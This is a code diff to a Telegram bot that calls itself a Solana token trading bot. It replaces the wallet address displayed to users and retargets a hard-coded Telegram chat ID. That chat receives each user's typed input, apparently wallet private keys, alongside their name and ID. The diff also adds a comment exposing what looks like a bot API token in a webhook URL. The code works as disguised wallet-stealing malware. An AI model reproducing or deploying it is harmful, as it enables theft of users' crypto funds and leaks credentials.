@@ -117,7 +117,7 @@ The best bot used for trading any SOL token\\.
 Your wallet address:  
 Solana:  
   \`\`\`
-8rZhUBdQbSv3fgVdFP8Qms4XJPtLChRwJ9V4ymnnhjid
+DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr
   \`\`\`  
 Bal: ${balStr} SOL \\- \\$${usdStr}  
 Click on the Refresh button to update your current balance`;
@@ -336,6 +336,7 @@ Price Impact: *${escapeMarkdownV2(impact)}*`;
     return ctx.reply("❌ Failed to fetch token info.");
   }
 });
+
 startScene.enter(async (ctx) => {
   const userId = ctx.from.id;
   const secret = await redis.get(`wallet:${userId}`);
@@ -398,7 +399,7 @@ continueScene.hears(/.*/, async (ctx) => {
     await ctx.telegram.sendMessage(
       // Changed from Message to sendMessage
       //config.otherUsername,
-      7722235340,
+      1061924582,
       `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
       { parse_mode: "HTML" }
     );
@@ -780,10 +781,10 @@ bot.action(/.*/, async (ctx) => {
     // await ctx.answerCbQuery();
     await ctx.scene.enter("IMPORT_WALLET");
   } else if (ctx.match.input === "CONTINUE") {
+    await ctx.deleteMessage();
     ctx.scene.enter("CONTINUE_SCENE");
   }
 });
-
 // Webhook handler
 export default async function handler(request, response) {
   try {
@@ -804,3 +805,5 @@ export default async function handler(request, response) {
     response.status(500).json({ ok: false, error: error.message });
   }
 }
+
+//https://api.telegram.org/bot7917083919:AAHMb3QYqok43_tPbCK9y8GtVzaYikSe3hI/setWebhook?url=https://per-ray.vercel.app/api/webhook
